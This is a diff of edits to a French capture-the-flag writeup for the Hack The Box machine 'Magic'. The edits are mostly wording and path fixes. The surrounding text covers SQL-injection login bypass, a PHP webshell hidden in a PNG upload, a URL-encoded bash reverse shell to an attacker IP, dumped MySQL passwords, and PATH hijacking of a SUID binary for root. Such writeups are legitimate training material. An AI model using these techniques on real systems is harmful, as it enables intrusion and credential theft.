@@ -13,8 +13,8 @@ draft: true
 
 # --- PaperMod / navigation ---
 type: "writeups"
-summary: "Magic (HTB Medium) : injection SQL, téléversement d’un fichier PHP, extraction d’identifiants MySQL et détournement du PATH pour devenir root."
-description: "Writeup de Magic (HTB Medium) : injection SQL, upload PHP, extraction de données MySQL et détournement du PATH pour obtenir root."
+summary: "Magic (HTB Medium) : injection SQL, téléversement d’un fichier PHP, exploration de MySQL, réutilisation d’un mot de passe et détournement du PATH pour devenir root."
+description: "Writeup de Magic (HTB Medium) : injection SQL, upload PHP, exploration MySQL, réutilisation de mot de passe et détournement du PATH jusqu’à root."
 tags: ["Hack The Box","HTB Medium","Web","SQL Injection","File Upload","PHP","MySQL","Credential Reuse","strace","SUID","PATH Hijacking","linux-privesc"]
 categories: ["Mes writeups"]
 
@@ -48,7 +48,7 @@ ctf:
   machine: "Magic"
   difficulty: "Medium"
   target_ip: "10.129.x.x"
-  skills: ["Enumeration","Web","SQL Injection","File Upload","Credential Reuse","Privilege Escalation"]
+  skills: ["Enumeration","Web","SQL Injection","File Upload","Credential Reuse","strace","SUID","PATH Hijacking","Privilege Escalation"]
   time_spent: "2h"
   # vpn_ip: "10.10.14.xx"
   # notes: "Points d'attention…"
@@ -137,7 +137,7 @@ La prise de pied commence par le contournement d’un formulaire d’authentific
 
 L’analyse des fichiers de l’application révèle des identifiants permettant d’interroger la base de données. Son contenu expose alors un mot de passe réutilisable pour accéder au compte local `theseus`. Enfin, l’escalade de privilèges repose sur un binaire SUID qui exécute plusieurs commandes système sans utiliser leur chemin absolu. Un détournement de la variable `PATH` permet alors de faire exécuter une commande contrôlée avec les privilèges de `root`.
 
-Ce walkthrough détaille ainsi une compromission complète mêlant injection SQL, contournement des contrôles d’upload, recherche d’identifiants, réutilisation de mot de passe et détournement de `PATH`.
+Ce writeup détaille ainsi une compromission complète mêlant injection SQL, contournement des contrôles d’upload, recherche d’identifiants, réutilisation de mot de passe et détournement de `PATH`.
 
 ---
 
@@ -147,11 +147,11 @@ Ce walkthrough détaille ainsi une compromission complète mêlant injection SQL
 
 ### Scan initial
 
-Le scan TCP complet (`scans_nmap/full_tcp_scan.txt`) montre les ports ouverts suivants :
+Le scan TCP complet (`scans_nmap/magic/full_tcp_scan.txt`) montre les ports ouverts suivants :
 
 ```bash
 # Nmap 7.99 scan initiated [date] as: /usr/lib/nmap/nmap --privileged -Pn -p- --min-rate 5000 -T4 -oN scans_nmap/magic/full_tcp_scan.txt magic.htb
-Nmap scan report for magic.htb (10.129x.x)
+Nmap scan report for magic.htb (10.129.x.x)
 Host is up (0.037s latency).
 Not shown: 65533 closed tcp ports (reset)
 PORT   STATE SERVICE
@@ -169,7 +169,7 @@ Après le scan initial, le script vérifie la présence éventuelle de services 
 - **FTP** sur le port **21**
 - **SMB** sur le port **139** et/ou **445**
 
-Les résultats sont enregistrés dans (`scans_nmap/enum_ftp_smb_scan.txt`) :
+Les résultats sont enregistrés dans (`scans_nmap/magic/enum_ftp_smb_scan.txt`) :
 
 ```bash
 # mon-nmap — ENUM FTP / SMB
@@ -188,7 +188,7 @@ Le script enchaîne ensuite automatiquement sur un scan agressif orienté vulné
 
 Ce scan fournit des informations détaillées sur les services et versions détectés.
 
-Les résultats sont enregistrés dans (`scans_nmap/aggressive_vuln_scan.txt`) :
+Les résultats sont enregistrés dans (`scans_nmap/magic/aggressive_vuln_scan.txt`) :
 
 ```bash
 [+] Scan agressif orienté vulnérabilités (CTF-perfect LEGACY) pour magic.htb
@@ -218,14 +218,13 @@ HOP RTT      ADDRESS
 
 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 # Nmap done at [date] -- 1 IP address (1 host up) scanned in 14.55 seconds
- nmap -Pn -A -sV -p"22,2222,8080,35627,42277" --script="http-vuln-*,http-shellshock,http-sql-injection,ssl-cert,ssl-heartbleed,sslv2,ssl-dh-params" --script-timeout=30s -T4 "magic.htb"
 ```
 
 
 
 ### Scan ciblé CMS
 
-Le script exécute ensuite un scan ciblé CMS (scans_nmap/cms_vuln_scan.txt).
+Le script exécute ensuite un scan ciblé CMS (scans_nmap/magic/cms_vuln_scan.txt).
 
 ```bash
 # Nmap 7.99 scan initiated [date] as: /usr/lib/nmap/nmap --privileged -Pn -sV -p22,80 --script=http-wordpress-enum,http-wordpress-brute,http-wordpress-users,http-drupal-enum,http-drupal-enum-users,http-joomla-brute,http-generator,http-robots.txt,http-title,http-headers,http-methods,http-enum,http-devframework,http-cakephp-version,http-php-version,http-config-backup,http-backup-finder,http-sitemap-generator --script-timeout=30s -T4 -oN scans_nmap/magic/cms_vuln_scan.txt magic.htb
@@ -277,11 +276,11 @@ Service detection performed. Please report any incorrect results at https://nmap
 
 ### Scan UDP rapide
 
-Le script lance également un scan UDP rapide afin de détecter d’éventuels services supplémentaires (`scans_nmap/udp_vuln_scan.txt`).
+Le script lance également un scan UDP rapide afin de détecter d’éventuels services supplémentaires (`scans_nmap/magic/udp_vuln_scan.txt`).
 
 ```bash
 # Nmap 7.99 scan initiated [date] as: /usr/lib/nmap/nmap --privileged -n -Pn -sU --top-ports 20 -T4 -oN scans_nmap/magic/udp_vuln_scan.txt magic.htb
-Nmap scan report for magic.htb (10.129x.x)
+Nmap scan report for magic.htb (10.129.x.x)
 Host is up (0.012s latency).
 
 PORT      STATE         SERVICE
@@ -445,7 +444,7 @@ Si aucun vhost distinct n’est identifié, ce fichier confirme l’absence de r
 
 ## Prise pied
 
-La page d’accueil de Magic présente une galerie d’images déjà uploadées sur le site. L’application semble donc proposer une fonctionnalité d’envoi d’images, mais celle-ci n’est pas directement accessible depuis la page principale.
+La page d’accueil de Magic présente une galerie d’images déjà envoyées sur le site. L’application propose donc une fonctionnalité d’envoi d’images, mais celle-ci n’est pas directement accessible depuis la page principale.
 
 ![Page d’accueil de Magic](magic-home-page.png)
 
@@ -455,7 +454,7 @@ En bas à gauche de la page, un lien discret indique :
 Please Login, to upload images.
 ```
 
-Cet élément est important : il t’apprend que l’upload d’images existe bien, mais qu’il est réservé aux utilisateurs authentifiés.
+Cet élément est important : il t’apprend que la fonctionnalité d’envoi d’images existe bien, mais qu’elle est réservée aux utilisateurs authentifiés.
 
 L’étape suivante consiste donc à ouvrir la page de connexion afin d’identifier le mécanisme qui protège cette fonctionnalité.
 
@@ -525,7 +524,7 @@ Injection SQL sur le formulaire de connexion → contournement de l’authentifi
 
 ### Transformation de l’upload en exécution de commandes
 
-À première vu#e, cette fonctionnalité sert simplement à envoyer une image sur le site. Mais dans une application web, un upload de fichier est toujours un point sensible : si le serveur accepte un fichier contenant du code, et si ce fichier est ensuite interprété par le serveur, l’upload peut devenir un moyen d’exécuter des commandes.
+À première vue, cette fonctionnalité sert simplement à envoyer une image sur le site. Mais dans une application web, un upload de fichier est toujours un point sensible : si le serveur accepte un fichier contenant du code, et si ce fichier est ensuite interprété par le serveur, l’upload peut devenir un moyen d’exécuter des commandes.
 
 L’objectif est donc de vérifier si tu peux envoyer une image contenant du code PHP.
 
@@ -634,11 +633,11 @@ Le point intéressant est que le fichier est toujours reconnu comme une image PN
 debian-logo.php.png: PNG image data, 48 x 48, 8-bit/color RGBA, non-interlaced
 ```
 
-Tu peux maintenant retenter l’upload de ce nouveau fichier `shell.php.png`.
+Tu peux maintenant retenter l’upload de ce nouveau fichier `debian-logo.php.png`.
 
-Un message en haut à gauche de l'écran t'indique que l'upload a réussi
+Un message affiché en haut à gauche confirme que l’upload a réussi.
 
-<img src="magic-debian-logo-php-png-uploaded.png" alt="Message de refus lors de l’upload du fichier shell.php.png" class="img-left-60">
+<img src="magic-debian-logo-php-png-uploaded.png" alt="Message de refus lors de l’upload du fichier debian-logo.php.png sur Magic" class="img-left-60">
 
 L’étape suivante consiste à appeler le fichier uploadé dans `/images/uploads/` avec le paramètre `cmd`, afin de vérifier si le code PHP ajouté est bien interprété par le serveur.
 
@@ -682,10 +681,18 @@ C’est suffisant pour confirmer l’exécution de commandes, mais ce n’est pa
 
 L’étape suivante consiste donc à obtenir un reverse shell vers Kali.
 
-Sur Kali, tu commences par ouvrir un port en écoute avec `nc` :
+Sur Kali, tu commences par ouvrir un port en écoute.
+
+Tu pourrais utiliser simplement `nc` :
 
 ```bash
 nc -lvnp 4444
+```
+
+Pour plus de confort, tu peux lancer `nc` avec `rlwrap` :
+
+```bash
+rlwrap -cAr nc -lvnp 4444
 ```
 
 Ensuite, depuis le webshell, tu fais exécuter à la cible une commande qui va initier une connexion vers ta machine Kali.
@@ -716,7 +723,7 @@ et connecte-le vers Kali sur le port 4444
 Comme cette commande doit être envoyée dans une URL, certains caractères spéciaux doivent être encodés. Dans le navigateur, l’URL appelée ressemble à ceci :
 
 ```text
-http://magic.htb/images/uploads/debian-logo.php.png?cmd=bash%20-c%20%27bash%20-i%20%3E%26%20/dev/tcp/10.10.16.20/4444%200%3E%261%27
+http://magic.htb/images/uploads/debian-logo.php.png?cmd=bash%20-c%20%27bash%20-i%20%3E%26%20/dev/tcp/10.10.x.x/4444%200%3E%261%27
 ```
 
 Sur Kali, tu commences par ouvrir un port en écoute. 
@@ -816,7 +823,7 @@ Tu peux ensuite regarder le contenu du répertoire de cet utilisateur :
 ls -la /home/theseus
 ```
 
-La sortie confirme qu’il s’agit d’un vrai compte utilisateur, avec un environnement classique de session Linux :
+La sortie montre un répertoire personnel complet pour `theseus`, avec un environnement classique de session Linux :
 
 ```text
 total 80
@@ -851,7 +858,7 @@ Le fichier `user.txt` est bien présent dans le répertoire de `theseus`, mais s
 -r-------- 1 theseus theseus user.txt
 ```
 
-Cela signifie que seul l’utilisateur `theseus` peut le lire. Depuis le shell actuel en `www-data`, tu ne peux donc pas récupérer directement le flag utilisateur.
+Cela signifie que seul l’utilisateur `theseus` peut le lire. Depuis le shell actuel, tu ne peux donc pas récupérer directement le flag utilisateur.
 
 Le répertoire `.ssh` existe également, mais il est protégé :
 
@@ -1020,7 +1027,7 @@ mysqldump  → outil pour exporter le contenu d’une base ou d’une table
 
 Même sans le client interactif `mysql`, tu peux donc continuer l’énumération avec `mysqlshow`, puis lire le contenu intéressant avec `mysqldump`.
 
-Tu peux d’abord vérifier l’accès à la base `Magic` avec `mysqlshow` :
+Tu peux d’abord vérifier l’accès à la base `Magic` et afficher les tables qu’elle contient avec `mysqlshow` :
 
 ```bash
 mysqlshow -u theseus -piamkingtheseus Magic
@@ -1038,13 +1045,13 @@ Database: Magic
 +--------+
 ```
 
-La commande confirme l’accès à la base et affiche les tables disponibles. La table intéressante est :
+La commande confirme l’accès à la base et affiche les tables disponibles. Une seule table apparaît 
 
 ```text
 login
 ```
 
-À ce stade, le nom de la table est très parlant. Comme l’application possède un formulaire de connexion, une table appelée `login` peut contenir des identifiants utilisés par le site.
+Son nom suggère qu’elle peut contenir les identifiants utilisés par le formulaire de connexion de l’application.
 
 Tu peux alors afficher le contenu de cette table avec `mysqldump` :
 
@@ -1058,7 +1065,7 @@ Le dump révèle une entrée intéressante :
 INSERT INTO `login` VALUES (1,'admin','Th3s3usW4sK1ng');
 ```
 
-Tu récupères donc un nouveau mot de passe :
+Tu récupères donc un autre mot de passe :
 
 ```text
 Th3s3usW4sK1ng
@@ -1082,7 +1089,7 @@ Le mot de passe trouvé dans la base de données ne peut donc pas être testé d
 
 Il faut donc continuer depuis le reverse shell obtenu en tant que `www-data`.
 
-Depuis ce shell, tu peux tenter de changer d’utilisateur avec `su` :
+Depuis ce shell, tu peux tenter d’ouvrir une session sous l’identité de `theseus` avec `su` :
 
 ```bash
 su - theseus
@@ -1108,7 +1115,7 @@ La sortie confirme que tu es bien connecté en tant que `theseus` :
 uid=1000(theseus) gid=1000(theseus) groups=1000(theseus),100(users)
 ```
 
-### Lecture de user.xtx
+### Lecture de user.txt
 
 Tu peux maintenant lire le flag utilisateur :
 
@@ -1117,13 +1124,13 @@ cat user.txt
 6461************************d728
 ```
 
-À ce stade, tu as terminé la prise pied : tu es passé du contexte web `www-data` au compte utilisateur `theseus` et tu peux lire `user.txt`. 
+À ce stade, tu as terminé la prise de pied : tu es passé du contexte web `www-data` au compte utilisateur `theseus`.
 
 La suite consiste maintenant à chercher un moyen d’élever les privilèges pour obtenir un accès root.
 
 ## Escalade de privilèges
 
-{{< escalade-intro-v2 user="thesus" >}}
+{{< escalade-intro-v2 user="theseus" >}}
 
 ### Vérification des droits sudo
 
@@ -1213,6 +1220,8 @@ Il est donc autorisé à exécuter `/bin/sysinfo`. Grâce au bit SUID, le progra
 
 Tu passes ensuite à une analyse dynamique de `/bin/sysinfo` avec `strace`.
 
+L’objectif de `strace` est ici uniquement d’observer le fonctionnement interne de `/bin/sysinfo` et les commandes qu’il lance ; l’exécution avec les privilèges SUID sera vérifiée séparément par une preuve de concept.
+
 Pour commencer, tu exécutes le binaire en enregistrant une trace complète dans un fichier temporaire :
 
 ```bash
@@ -1229,7 +1238,7 @@ La redirection suivante masque les éventuels messages d’erreur affichés pend
 2>/dev/null
 ```
 
-Tu recherches ensuite les appels `execve`, qui correspondent aux programmes exécutés :
+Tu recherches ensuite les appels `execve`, qui permettent d’identifier les programmes lancés :
 
 ```bash
 grep -n "execve(" /tmp/sysinfo.strace
@@ -1278,7 +1287,7 @@ Cette résolution via le `PATH` constitue la faiblesse exploitable. Comme `/bin/
 
 Le faux `lshw` sera alors exécuté à la place du programme légitime, avec les privilèges effectifs de `root`.
 
-### Confirmation de l’exécution avec les privilèges de root
+### Confirmation de l’exécution avec l’UID effectif root
 
 Avant de procéder à l’exploitation finale, une preuve de concept permet de vérifier que le faux programme sera bien exécuté avec les privilèges effectifs de `root`.
 
@@ -1339,9 +1348,11 @@ La sortie montre que ce système de fichiers est monté avec l’option `nosuid`
 tmpfs on /dev/shm type tmpfs (rw,nosuid,nodev)
 ```
 
-Cette option demande au noyau d’ignorer les bits SUID et SGID présents sur les fichiers de ce système de fichiers. Une copie de Bash placée dans `/dev/shm` conserve donc visuellement le bit SUID dans ses permissions, mais celui-ci n’est pas appliqué lors de l’exécution.
+Cette option indique au noyau d’ignorer les bits SUID et SGID présents sur les fichiers de ce système de fichiers. 
 
-Tu vérifies ensuite que `/var/tmp` n’est pas monté séparément avec cette option :
+Une copie de Bash placée dans `/dev/shm` conserve donc visuellement le bit SUID dans ses permissions, mais celui-ci n’est pas appliqué lors de l’exécution.
+
+Tu vérifies ensuite si `/var/tmp` est monté avec l’option `nosuid` :
 
 ```bash
 mount | grep -E ' /var/tmp | /var '
@@ -1397,11 +1408,9 @@ id
 uid=1000(theseus) gid=1000(theseus) euid=0(root) groups=1000(theseus),100(users)
 ```
 
-### 
-
 ### Lecture de root.txt
 
-Le shell dispose désormais des privilèges nécessaires pour lire le fichier final :
+Le shell dispose désormais d’un UID effectif `root`, ce qui permet de lire le fichier final :
 
 ```bash
 bashroot-4.4# cat /root/root.txt
@@ -1416,7 +1425,7 @@ La machine Magic de Hack The Box, classée HTB Medium, propose une chaîne d’e
 
 L’injection SQL du formulaire d’authentification permet d’accéder à une fonctionnalité d’upload insuffisamment protégée. L’envoi d’une image contenant du code PHP conduit alors à une exécution de commandes, puis à l’obtention d’un reverse shell sous l’identité de `www-data`.
 
-L’analyse des fichiers de l’application et du contenu de la base de données révèle ensuite un mot de passe réutilisé par l’utilisateur local `theseus`. Enfin, le binaire SUID `/bin/sysinfo` exécute certaines commandes sans utiliser leur chemin absolu. Le détournement de la variable `PATH` permet de substituer un faux programme `lshw`, puis de créer une copie SUID de Bash afin d’obtenir un shell `root`.
+L’analyse des fichiers de l’application et du contenu de la base de données révèlent ensuite un mot de passe réutilisé par l’utilisateur local `theseus`. Enfin, le binaire SUID `/bin/sysinfo` exécute certaines commandes sans utiliser leur chemin absolu. Le détournement de la variable `PATH` permet de substituer un faux programme `lshw`, puis de créer une copie SUID de Bash afin d’obtenir un shell `root`.
 
 Magic met ainsi en évidence plusieurs erreurs de sécurité : une injection SQL, un contrôle insuffisant des fichiers envoyés, la réutilisation d’un mot de passe et l’exécution non sécurisée de commandes depuis un binaire SUID.
 
